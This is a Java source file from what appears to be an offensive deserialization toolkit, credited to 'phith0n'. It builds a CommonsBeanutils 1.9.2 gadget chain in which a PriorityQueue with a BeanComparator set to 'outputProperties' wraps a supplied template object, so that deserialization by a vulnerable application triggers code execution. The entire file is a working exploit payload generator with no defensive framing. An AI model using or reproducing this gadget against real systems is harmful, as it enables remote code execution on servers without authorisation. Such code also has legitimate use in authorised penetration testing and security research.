package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

import com.summersec.attack.deser.util.StandardExecutorClassLoader;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"phith0n"})
public class CommonsBeanutilsString_192 implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {

        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        System.out.println(u.getPackage());

//        UrlClassLoaderUtils urlClassLoaderUtils = new UrlClassLoaderUtils();
//        Class u = urlClassLoaderUtils.loadJar("").loadClass("org.apache.commons.beanutils.BeanComparator");

        Object beanComparator = u.getDeclaredConstructor(String.class,Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);



        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { template, template });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutilsString_192 commonsBeanutilsString192 = new CommonsBeanutilsString_192();
        commonsBeanutilsString192.getObject(new Object());

    }
}



